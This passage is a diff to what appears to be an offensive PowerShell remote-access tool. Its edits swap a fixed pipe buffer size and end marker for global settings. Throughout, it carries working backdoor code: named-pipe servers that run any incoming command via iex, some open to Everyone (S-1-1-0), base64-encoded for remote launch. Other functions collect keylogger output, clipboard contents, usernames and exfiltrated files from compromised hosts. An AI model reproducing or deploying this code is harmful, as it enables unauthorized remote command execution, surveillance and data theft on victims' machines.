+		$RawServerScript="`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier ""S-1-1-0"";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,""FullControl"",""Allow"");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sD);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq""exit""){break}else{try{`$res=iex ""`$cmd 2>&1 | Out-String"";`$res -split ""`u{000A}"" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split""`u{000D}`u{000A}"" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine(""$($global:EndMarker)"");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
 	}
 	else{
-		$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
+		$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
 	
-		$RawServerScript="`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier ""$SID"";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,""FullControl"",""Allow"");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sD);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq""exit""){break}else{try{`$res=iex ""`$cmd 2>&1 | Out-String"";`$res -split ""`u{000A}"" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split""`u{000D}`u{000A}"" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine(""#END#"");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
+		$RawServerScript="`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier ""$SID"";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,""FullControl"",""Allow"");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sD);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq""exit""){break}else{try{`$res=iex ""`$cmd 2>&1 | Out-String"";`$res -split ""`u{000A}"" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split""`u{000D}`u{000A}"" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine(""$($global:EndMarker)"");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
 	}
 	
 	$PwshRawServerScript = $RawServerScript
@@ -1632,7 +1632,7 @@ function Print-MultiListener {
 `$singleuser = New-Object System.Security.Principal.SecurityIdentifier "$SID"
 `$accessRule = New-Object System.IO.Pipes.PipeAccessRule(`$singleuser, "FullControl", "Allow")
 `$securityDescriptor.AddAccessRule(`$accessRule)
-`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream('$PN', 'InOut', 1, 'Byte', 'None', 1028, 1028, `$securityDescriptor)
+`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream('$PN', 'InOut', 1, 'Byte', 'None', $global:BufferSize, $global:BufferSize, `$securityDescriptor)
 `$pipeServer.WaitForConnection()
 `$sr = New-Object System.IO.StreamReader(`$pipeServer)
 `$sw = New-Object System.IO.StreamWriter(`$pipeServer)
@@ -1649,7 +1649,7 @@ while (`$true) {
 			`$errorMessage = `$_.Exception.Message
 			`$errorMessage -split "`r?`n" | ForEach-Object {`$sw.WriteLine(`$_)}
 		}
-		`$sw.WriteLine("#END#")
+		`$sw.WriteLine("$($global:EndMarker)")
 		`$sw.Flush()
 	}
 }
@@ -1767,7 +1767,7 @@ function Scan-WaitingTargets{
 			
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					#$whoamiInfo = $whoamiInfo.Trim()
 					break
 				} elseif ($whoamiInfo -eq "") {
@@ -1886,7 +1886,7 @@ function InteractWithPipeSession{
 			$output = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					return $output
 				}
 				$output += "$line`n"
@@ -1995,7 +1995,7 @@ function InteractWithPipeSession{
 			
 			while($true){
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					Write-Output "[+] Resynchronized with stream."
 					Write-Output ""
 					break
@@ -2013,7 +2013,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				} else {
 					$gatherhostname += "$line`n"
@@ -2036,7 +2036,7 @@ function InteractWithPipeSession{
 			if($global:Detach){$SID = 'S-1-1-0'}
 			else{$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value}
 			
-			$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
+			$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
 			
 			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 
@@ -2068,7 +2068,7 @@ function InteractWithPipeSession{
 			
 			while($true){
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 			}
@@ -2097,7 +2097,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				} else {
 					$gatherhostname += "$line`n"
@@ -2116,7 +2116,7 @@ function InteractWithPipeSession{
 			if($global:Detach){$SID = 'S-1-1-0'}
 			else{$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value}
 			
-			$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
+			$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
 			
 			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 			
@@ -2131,7 +2131,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 			}
@@ -2161,7 +2161,7 @@ function InteractWithPipeSession{
 			$fileContentBase64 = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 				$fileContentBase64 += $line
@@ -2322,7 +2322,7 @@ function InteractWithPipeSession{
 			
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 			}
@@ -2342,7 +2342,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				} else {
 					$serverOutput += "$line`n"
@@ -2391,7 +2391,7 @@ function InteractWithPipeSession{
 			
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 			}
@@ -2408,7 +2408,7 @@ function InteractWithPipeSession{
 			$TempUsernameGrab = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 				$TempUsernameGrab += $line
@@ -2422,7 +2422,7 @@ function InteractWithPipeSession{
 			$KeylogContent = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					if($KeylogContent){
 						Write-Output $KeylogContent.Trim()
 						Write-Output ""
@@ -2470,7 +2470,7 @@ function InteractWithPipeSession{
 			
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 			}
@@ -2487,7 +2487,7 @@ function InteractWithPipeSession{
 			$TempUsernameGrab = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 				$TempUsernameGrab += $line
@@ -2499,7 +2499,7 @@ function InteractWithPipeSession{
 			$KeylogContent = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					if($KeylogContent){
 						Write-Output $KeylogContent.Trim()
 						Write-Output ""
@@ -2549,7 +2549,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					# Remove any extraneous whitespace, newlines etc.
 					$UserPath = $UserPath.Trim()
 					break
@@ -2571,7 +2571,7 @@ function InteractWithPipeSession{
 				while ($true) {
 					$line = $sr.ReadLine()
 
-					if ($line -eq "#END#") {
+					if ($line -eq $global:EndMarker) {
 						break
 					}
 				}
@@ -2612,7 +2612,7 @@ function InteractWithPipeSession{
 			$TempUsernameGrab = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 				$TempUsernameGrab += $line
@@ -2624,7 +2624,7 @@ function InteractWithPipeSession{
 			$fileContentBase64 = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 				$fileContentBase64 += $line
@@ -2677,7 +2677,7 @@ function InteractWithPipeSession{
 			$TempUsernameGrab = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 				$TempUsernameGrab += "$line`n"
@@ -2698,7 +2698,7 @@ function InteractWithPipeSession{
 				$fileContentBase64 = ""
 				while ($true) {
 					$line = $sr.ReadLine()
-					if ($line -eq "#END#") {
+					if ($line -eq $global:EndMarker) {
 						break
 					}
 					$fileContentBase64 += $line
@@ -2737,7 +2737,7 @@ function InteractWithPipeSession{
 			$TempUsernameGrab = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 				$TempUsernameGrab += $line
@@ -2749,7 +2749,7 @@ function InteractWithPipeSession{
 			$ClipboardContent = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 				$ClipboardContent += $line
@@ -2800,7 +2800,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				} else {
 					$InjectOutput += "$line`n"
@@ -2854,7 +2854,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				} else {
 					$gatherhostname += "$line`n"
@@ -2873,7 +2873,7 @@ function InteractWithPipeSession{
 			if($global:Detach){$SID = 'S-1-1-0'}
 			else{$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value}
 			
-			$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
+			$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
 			
 			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 			
@@ -2891,7 +2891,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 			}
@@ -2902,7 +2902,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				}
 			}
@@ -2914,7 +2914,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					break
 				} else {
 					$InjectOutput += "$line`n"
@@ -2997,8 +2997,8 @@ function InteractWithPipeSession{
 			$PN = $global:MultiPipeName
 			$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
 			
-			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
-			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
 	
 			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 			
@@ -3071,7 +3071,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					Write-Output ""
 					break
 				} else {
@@ -3152,8 +3152,8 @@ function InteractWithPipeSession{
 			$PN = $global:MultiPipeName
 			$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
 			
-			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
